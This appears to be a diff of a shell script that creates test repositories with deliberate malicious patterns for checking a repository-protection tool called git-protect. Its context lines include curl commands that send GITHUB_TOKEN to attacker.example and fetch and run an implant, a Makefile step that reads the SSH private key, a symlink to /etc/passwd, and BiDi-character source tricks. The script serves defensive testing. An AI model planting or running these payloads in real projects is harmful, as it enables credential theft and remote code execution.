@@ -2,7 +2,7 @@
 set -euo pipefail
 
 # Creates test repos with various attack vectors for manual git-protect testing.
-# These repos contain INTENTIONALLY MALICIOUS patterns — that's the point.
+# These repos contain INTENTIONALLY MALICIOUS patterns – that's the point.
 # git-protect should detect and block all of them.
 #
 # Usage: ./test-repos/setup-attack-repos.sh
@@ -34,7 +34,7 @@ echo "=== Creating attack test repos ==="
 echo ""
 
 # 1. VS Code tasks.json with folderOpen (Contagious Interview attack)
-echo "[1] vscode-folderopen — VS Code auto-run on folder open"
+echo "[1] vscode-folderopen – VS Code auto-run on folder open"
 DIR=$(init_repo "01-vscode-folderopen")
 mkdir -p "$DIR/.vscode"
 cat > "$DIR/.vscode/tasks.json" << 'TASK'
@@ -53,7 +53,7 @@ echo "# Interview Task" > "$DIR/README.md"
 commit_repo "$DIR"
 
 # 2. .envrc with GIT_CONFIG_* bypass
-echo "[2] envrc-gitconfig — .envrc overrides git config protections"
+echo "[2] envrc-gitconfig – .envrc overrides git config protections"
 DIR=$(init_repo "02-envrc-gitconfig")
 cat > "$DIR/.envrc" << 'ENVRC'
 export GIT_CONFIG_COUNT=2
@@ -66,7 +66,7 @@ echo "# Dev Project" > "$DIR/README.md"
 commit_repo "$DIR"
 
 # 3. Embedded bare repo with fsmonitor
-echo "[3] embedded-bare-repo — hidden .git/ with core.fsmonitor"
+echo "[3] embedded-bare-repo – hidden .git/ with core.fsmonitor"
 DIR=$(init_repo "03-embedded-bare-repo")
 mkdir -p "$DIR/vendor/analytics/.git"
 cat > "$DIR/vendor/analytics/.git/config" << 'CFG'
@@ -80,7 +80,7 @@ echo "# Main" > "$DIR/README.md"
 commit_repo "$DIR"
 
 # 4. Malicious .gitattributes with custom filter
-echo "[4] gitattributes-filter — custom smudge filter"
+echo "[4] gitattributes-filter – custom smudge filter"
 DIR=$(init_repo "04-gitattributes-filter")
 echo '*.c filter=compile' > "$DIR/.gitattributes"
 echo 'int main() { return 0; }' > "$DIR/main.c"
@@ -88,7 +88,7 @@ echo "# C Project" > "$DIR/README.md"
 commit_repo "$DIR"
 
 # 5. Submodule with ext:: protocol
-echo "[5] submodule-ext — ext:: protocol command execution"
+echo "[5] submodule-ext – ext:: protocol command execution"
 DIR=$(init_repo "05-submodule-ext")
 cat > "$DIR/.gitmodules" << 'MODS'
 [submodule "lib"]
@@ -99,7 +99,7 @@ echo "# Project" > "$DIR/README.md"
 commit_repo "$DIR"
 
 # 6. Submodule with path traversal
-echo "[6] submodule-traversal — path escapes repo boundary"
+echo "[6] submodule-traversal – path escapes repo boundary"
 DIR=$(init_repo "06-submodule-traversal")
 cat > "$DIR/.gitmodules" << 'MODS'
 [submodule "escape"]
@@ -110,7 +110,7 @@ echo "# Project" > "$DIR/README.md"
 commit_repo "$DIR"
 
 # 7. Credential stealing script
-echo "[7] credential-stealer — exfiltrates SSH keys and AWS creds"
+echo "[7] credential-stealer – exfiltrates SSH keys and AWS creds"
 DIR=$(init_repo "07-credential-stealer")
 cat > "$DIR/setup.sh" << 'SETUP'
 #!/bin/bash
@@ -121,11 +121,11 @@ echo "$GITHUB_TOKEN" | curl -s -X POST -d @- http://attacker.example/collect
 echo "Setup complete!"
 SETUP
 chmod +x "$DIR/setup.sh"
-echo "# Quick Start — run setup.sh" > "$DIR/README.md"
+echo "# Quick Start – run setup.sh" > "$DIR/README.md"
 commit_repo "$DIR"
 
 # 8. package.json with dangerous lifecycle hooks
-echo "[8] npm-postinstall — postinstall runs on npm install"
+echo "[8] npm-postinstall – postinstall runs on npm install"
 DIR=$(init_repo "08-npm-postinstall")
 cat > "$DIR/package.json" << 'PKG'
 {
@@ -144,11 +144,11 @@ execFile('curl', ['-s', 'http://attacker.example/implant.sh'], (err, stdout) => 
     execFile('bash', ['-c', stdout]);
 });
 JS
-echo "# Frontend Challenge — run npm install" > "$DIR/README.md"
+echo "# Frontend Challenge – run npm install" > "$DIR/README.md"
 commit_repo "$DIR"
 
 # 9. Trojan Source (BiDi control characters)
-echo "[9] trojan-source — BiDi chars hide malicious logic"
+echo "[9] trojan-source – BiDi chars hide malicious logic"
 DIR=$(init_repo "09-trojan-source")
 # Embed U+202A (LRE) and U+202C (PDF) in Go source
 printf 'package main\n\nimport "fmt"\n\nfunc main() {\n\tvar isAdmin = false\n\t// Check access \xe2\x80\xaa\n\tif isAdmin {\xe2\x80\xac {\n\t\tfmt.Println("Access granted")\n\t}\n}\n' > "$DIR/main.go"
@@ -156,7 +156,7 @@ echo "# Go Project" > "$DIR/README.md"
 commit_repo "$DIR"
 
 # 10. Devcontainer with lifecycle hooks
-echo "[10] devcontainer — lifecycle hooks run in container"
+echo "[10] devcontainer – lifecycle hooks run in container"
 DIR=$(init_repo "10-devcontainer")
 mkdir -p "$DIR/.devcontainer"
 cat > "$DIR/.devcontainer/devcontainer.json" << 'DC'
@@ -170,7 +170,7 @@ echo "# Open in Codespaces" > "$DIR/README.md"
 commit_repo "$DIR"
 
 # 11. VS Code settings override interpreters
-echo "[11] vscode-settings — overrides Python/git binary path"
+echo "[11] vscode-settings – overrides Python/git binary path"
 DIR=$(init_repo "11-vscode-settings")
 mkdir -p "$DIR/.vscode"
 cat > "$DIR/.vscode/settings.json" << 'SETTINGS'
@@ -184,7 +184,7 @@ echo "# Python Project" > "$DIR/README.md"
 commit_repo "$DIR"
 
 # 12. GitHub Actions with suspicious commands
-echo "[12] ci-pipeline — GitHub Actions with curl|sh"
+echo "[12] ci-pipeline – GitHub Actions with curl|sh"
 DIR=$(init_repo "12-ci-pipeline")
 mkdir -p "$DIR/.github/workflows"
 cat > "$DIR/.github/workflows/ci.yml" << 'CI'
@@ -201,21 +201,21 @@ echo "# Project" > "$DIR/README.md"
 commit_repo "$DIR"
 
 # 13. Makefile with $(shell)
-echo "[13] makefile-shell — $(shell) executes during make parse"
+echo "[13] makefile-shell – $(shell) executes during make parse"
 DIR=$(init_repo "13-makefile-shell")
 printf 'TOKEN := $(shell cat ~/.ssh/id_rsa 2>/dev/null | base64 -w0)\nall: main.c\n\tgcc -o main main.c\n' > "$DIR/Makefile"
 echo 'int main() { return 0; }' > "$DIR/main.c"
 commit_repo "$DIR"
 
 # 14. Symlink escaping repo
-echo "[14] symlink-escape — symlink points to /etc/passwd"
+echo "[14] symlink-escape – symlink points to /etc/passwd"
 DIR=$(init_repo "14-symlink-escape")
 ln -s /etc/passwd "$DIR/passwords.txt"
 echo "# Project" > "$DIR/README.md"
 commit_repo "$DIR"
 
-# 15. Clean repo (control — should pass)
-echo "[15] clean-repo — legitimate project, no threats"
+# 15. Clean repo (control – should pass)
+echo "[15] clean-repo – legitimate project, no threats"
 DIR=$(init_repo "15-clean-repo")
 cat > "$DIR/main.go" << 'GO'
 package main
